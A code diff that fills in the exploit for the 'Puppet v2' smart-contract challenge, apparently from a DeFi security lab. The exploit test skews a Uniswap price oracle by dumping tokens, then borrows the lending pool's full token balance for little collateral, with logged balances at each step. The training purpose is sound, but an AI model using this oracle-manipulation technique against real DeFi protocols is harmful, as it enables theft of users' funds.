@@ -81,7 +81,70 @@ describe('[Challenge] Puppet v2', function () {
   })
 
   it('Exploit', async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    const printBalance = async () => {
+      const attackerETHBalance = await ethers.provider.getBalance(attacker.address)
+      const attackerWETHBalance = await this.weth.balanceOf(attacker.address)
+      const attackerTokenBalance = await this.token.balanceOf(attacker.address)
+
+      console.log('Attacker ETH: ', ethers.utils.formatEther(attackerETHBalance))
+      console.log('Attacker WETH: ', ethers.utils.formatEther(attackerWETHBalance))
+      console.log('Attacker DVT: ', ethers.utils.formatEther(attackerTokenBalance))
+
+      const uniswapWETHBalance = await this.weth.balanceOf(this.uniswapExchange.address)
+      const uniswapTokenBalance = await this.token.balanceOf(this.uniswapExchange.address)
+
+      console.log('Uniswap WETH: ', ethers.utils.formatEther(uniswapWETHBalance))
+      console.log('Uniswap DVT: ', ethers.utils.formatEther(uniswapTokenBalance))
+
+      const lendingPoolDVTBalance = await this.token.balanceOf(this.lendingPool.address)
+      console.log('LendingPool DVT: ', ethers.utils.formatEther(lendingPoolDVTBalance))
+    }
+    const attackerCallLendingPool = this.lendingPool.connect(attacker)
+    const attackerCallUniswap = this.uniswapRouter.connect(attacker)
+    const attackerCallToken = this.token.connect(attacker)
+    const attackerCallWETH = this.weth.connect(attacker)
+
+    // init:
+    // Attacker ETH:  20.0
+    // Attacker WETH:  0.0
+    // Attacker DVT:  10000.0
+    // Uniswap WETH:  100.0
+    // Uniswap DVT:  100.0
+    // LendingPool DVT:  1000000.0
+
+    // 授权 uniswap 支配 attacker 的 DVT token
+    await attackerCallToken.approve(attackerCallUniswap.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+
+    // 在 uniswap 中使用 DVT 兑换 ETH
+    await attackerCallUniswap.swapExactTokensForTokens(
+      ATTACKER_INITIAL_TOKEN_BALANCE, // transfer exactly 10,000 tokens
+      ethers.utils.parseEther('9'), // minimum of 9 WETH return
+      [attackerCallToken.address, attackerCallWETH.address], // token addresses
+      attacker.address,
+      (await ethers.provider.getBlock('latest')).timestamp * 2
+    )
+    // Attacker ETH:  19.99975413442550073
+    // Attacker WETH:  9.900695134061569016
+    // Attacker DVT:  0.0
+    // Uniswap WETH:  0.099304865938430984
+    // Uniswap DVT:  10100.0
+    // LendingPool DVT:  1000000.0
+
+    // 计算需要抵押的 ETH 数量
+    const collateralCount = await attackerCallLendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+    console.log('collateralCount: ', ethers.utils.formatEther(collateralCount))
+
+    await attackerCallWETH.approve(attackerCallLendingPool.address, collateralCount)
+    const tx = {
+      to: attackerCallWETH.address,
+      value: ethers.utils.parseEther('19.9')
+    }
+    await attacker.sendTransaction(tx)
+
+    // 借出 DVT
+    await attackerCallLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+      gasLimit: 1e6
+    })
   })
 
   after(async function () {
